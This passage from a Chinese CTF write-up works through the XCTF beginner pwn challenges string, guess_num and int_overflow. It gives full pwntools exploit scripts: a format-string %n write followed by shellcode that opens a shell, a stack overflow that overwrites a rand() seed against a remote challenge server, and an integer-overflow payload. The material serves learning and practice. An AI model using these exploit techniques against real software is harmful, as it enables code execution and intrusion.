push 函数地址
####  (4) 相关参考文章
[XCTF攻防世界 level2 ](https://bbs.pediy.com/thread-251334.htm)
[pwntools连gdb调试脚本](/thonsun.github.io/2019/07/17/pwntools%E8%BF%9Egdb%E8%B0%83%E8%AF%95%E8%84%9A%E6%9C%AC/\))
###  0x2.2 string
####  (1) 题目描述及其考点
菜鸡遇到了Dragon，有一位巫师可以帮助他逃离危险，但似乎需要一些要求
考点: 格式化字符串漏洞
####  (2) wp
日常查程序架构、保护
可以看到除了pie其他都开了,然后就是上ida了
这个程序有点复杂，当时我是一个一个函数跟进去看的，为了减少文章篇幅，这里只取重要的点来举例说明。
我们继续跟进sub_400BB9
但是因为开了保护，所以任意地址读写没办法直接拿到flag。
虽然在下一个函数我们可以发现只要满足条件*a1 == a1[1]那么我们就可以了,我们看下他们两者的取值过程。
这里感觉就很显然了，因为al就是v4,而v4的地址就是v3,写死了*v3=68
v3[1]=85,很很明显不相等，所以我们考虑结合下字符串格式化漏洞去修改其中一个值与另外一个值相等。
,竟然直接printf(“%x”)输出了*a和a1[1]的地址,
那么结合上面那个字符串格式化任意地址写，修改两者的值就可以轻松完成了，这里直接给出exp构造过程。
不理解字符串格式化的朋友,可以先看我前一篇[文章](https://www.anquanke.com/post/id/187922#h3-18)，这里我就不累赘了。
因为v3是malloc动态内存地址，所以我们先通过程序直接获取到v3地址
    io.recvuntil('secret[0] is ')
    addr = int(io.recvuntil('\n'), 16)
然后满足一些条件
    io.recvuntil('secret[0] is ')
    addr = int(io.recvuntil('\n'), 16)
    io.sendlineafter('be\n', 'xq17')
    io.sendlineafter('up\n', 'east')
    io.sendlineafter('leave(0)?:\n', '1')
这样我们就满足了条件,开始进入了
这里的printf一开始我不是很懂的，因为我之前做的是printf(&s);这样的形式，这里我们可以采取debug查看下
我们自己写一个程序并且关闭保护再编译:
    #include 
    int main()
    {
    char format;
    // char a = "123";
    scanf("%s", &format);
    printf(&format, &format);
    return 0;
    }
    gcc  -fno-stack-protector -no-pie -g -Wall printf.c -o test
我们可以发现其实这个很简单的，我们输入format=”%s” 其实就是等价printf(“%s”, “%s”)
那么根据printf函数定义,第一个是格式化字符串解析格式化字符%s然后把后面的参数解析位字符串”%s”
所以这里并不影响我们执行格式化字符串，因为我们主要利用还是第一个参数，第二个无所谓。
这里我们需要把v3修改为85,那么%$xn中的x就是p64(addr)对应的printf的第几个参数
然后
    sizeof(p64(addr)) + %(85-sizeof(p64(addr)) )c + %$xn
就可以利用printf修改addr中的值了。
利用的话我们是构造
    #!/usr/bin/env python
    #-*- coding:utf-8 -*-    
    from pwn import *
    context(log_level = 'debug', arch = 'amd64', os = 'linux')
    io =  process('./pwn7')
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    # 这里配置tmux纵向显示
    # gdb.attach(io)
    # io.sendlineafter("Input:\n",payload)
    io.recvuntil('secret[0] is ')
    addr = int(io.recvuntil('\n'), 16)
    io.sendlineafter('be:\n', 'xq171')
    io.sendlineafter('up?:\n', 'east')
    io.sendlineafter('leave(0)?:\n', '1')
    # gdb.attach(io)
    io.sendlineafter("address'\n", str(addr))
    io.sendlineafter("is:\n", str(addr) + "%77c%7$n")
    # io.sendlineafter("is:\n", "AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x")
    shellcode =  asm(shellcraft.sh())
    io.sendlineafter("SPELL\n", shellcode)
    io.interactive()
    io.close()
这里我是通过AAAA出现在第7个位置来确定位移的。
    # io.sendlineafter("is:\n", "AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x")
刚好是在第7个位置,然后 str(addr)存放了一个内存空间64位8字节
所以0x85-0x8=0x77
io.sendlineafter(“is:\n”, str(addr) + “%77c%7$n”) 这就是来源。
或者可以直接看栈结构,esp就是第一个第一个参数
可以看到format就是在第7个位置。
* * *
上面是华丽的错误分割线，其实我上面的说法是错误的，为什么能成功呢，主要原因还是修改了上面那个变量的值。
其实正确的做法是这样:
这里我们可以重新分析一下如果把
    io.sendlineafter("an address'\n", str(addr))
放在了v2变量上，那么怎么计算printf的第几个参数
我们通过pwntools+gdb来进行调试可以看到即将进入printf的函数的栈结构，可以看到v[0]存放的栈空间地址。
可以看printf获取到的参数,这里我们选择si跟进这个函数,
call 指令是调用函数 分为两步:(1)将当前的rip压入栈中 (2)转移到函数内  
push RIP  
jmp x
可以看到他把下一条要执行指令存到了栈里面，保护现场，然后跳到函数内部执行
然后开辟了栈空间，然后取参数,finish执行完，查看栈参数
这里是64位,参数存放有点问题,
在x86_64架构（Linux或Unix系统）上，函数的前6个参数是通过寄存器传递的
所以6+1=7 %7$n的位置就是对应格式化字符串输入的位置。可以看到0x21a9269就是我们对应的那个str(addr)
这就是网上那些wp的做法。
这里重新回到我们上一篇文章中通过自己在格式化字符串写入地址的做法
我当时做前面那个题目是把地址写在了格式化字符串里面的,也就是这样
    io.sendlineafter("is:\n", p64(addr)+"%77d%8$n")
然后开启gdb进行调试:
    gdb.attach(io, "b printf\n c") #设置下断点
然后finish查看
可以看到是在6+2=8第8个位置上,但是执行完的时候
x/2dx 0xf2c260 查看内存发现值并没有改变
这里介绍下gdb查看内存用法
比较常用:
x/2wd w是指定4字节长度,2是指取当前地址开始8字节也就是两个比如数组就是 v[0] v[1]的值,d就是十进制来显示
x/2wx x是16进制表示
[gdb调试时查看内存](https://blog.csdn.net/yasi_xi/article/details/7322278)
其实原因，还是因为64位转换地址的时候出现了截止字节\x00这样导致printf取参数的时候就没办法读取后面的字符进去了。
所以我们就要把地址放在后面，这样子来重新构造。
####  (3) 相关参考文章
[格式化字符串漏洞利用](https://wiki.x10sec.org/pwn/fmtstr/fmtstr_exploit/)
###  0x 2.3 guess_num
####  (1) 题目描述及其考点
菜鸡在玩一个猜数字的游戏，但他无论如何都银不了，你能帮助他么
考点: 栈溢出及其随机数原理
####  (2) wp
日常看保护,然后开ida。
保护全开
这个题目的基本思路是通过sub_BB0生成一个随机数种子,然后想要我们猜对后面的数列，gets函数因为不限制读取的长度，所以会造成栈溢出，这里涉及到一个很常见的随机数考点，就是计算机里面很多随机数都是伪随机数算法，就是根据一个seed生成一个固定的随机数数列
所以这个题目的考点就回到如何通过栈溢出覆盖掉seed[0]
我们可以看到这里的栈溢出保护没用，因为我们根本不会超出栈空间，
这里我们计算下相对位置:
-0x10 – (-0x30)=0x10
那么我们直接上exp就行了,这个题目考点还是比较简单的。
这里需要用到python一个库ctypes来伪造libc.so的随机数算法
首先查看程序使用的lib.so版本
cmd: ldd pwn8
    from pwn import *
    from ctypes import *
    io = remote('111.198.29.45', 54570)
    libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
    # 这里修改种子为1
    payload = 'A'*0x10 + p64(1)
    io.sendlineafter('name:',payload)
    for i in range(20):
    # rand 默认是种子是1
    io.sendlineafter('number:',str(libc.rand()%6 + 1))
    io.interactive()
####  (3)题目小结
这个题目感觉没什么考点，不过能巩固之前学的知识点，而且与一些其他特性结合起来，比如随机数考点，对于我这个摸鱼几年的web选手来说应该比较熟悉了。
###  0x2.4 int_overflow
####  (1) 题目描述及其考点
菜鸡感觉这题似乎没有办法溢出，真的么?
考点: 整数溢出
####  (2) wp
按照前面所讲的思路，跟进所有函数，发现关键函数(笔者开始省略日常步骤，建议新手实操检验学习成果)
这里看到将最大长度为0x199的s传给char为1的dest(距离ebp 0x14h),这里就会造成栈溢出，我们发现程序存在system函数
然后通过ida定位ctrl+x我们可以找到cat /flag函数的地址为:0x0804868B
解决了上面问题，我们就要思考如何控制程序进入我们上述的流程了。
但是前面好像限制了输入的长度v3(无符号整数范围就是0-2^8-1),但是我们至少都得溢出(0x14h+size(ebp))（24）长度
所以这里我们就可以控制v3让他超过范围发生整数溢出,这样我们就可以输出超过8位的字符,通过计算控制溢出之后的v3范围在3-8
那么我们的构造公式就可以是:’A’*24 + p32(0x0804868B)+ ‘A’+(259-28) 这样溢出的时候v3就是3了。
直接丢出exp,多出来的长度会继续向下覆盖，但是程序跳转到system了所以没有关系。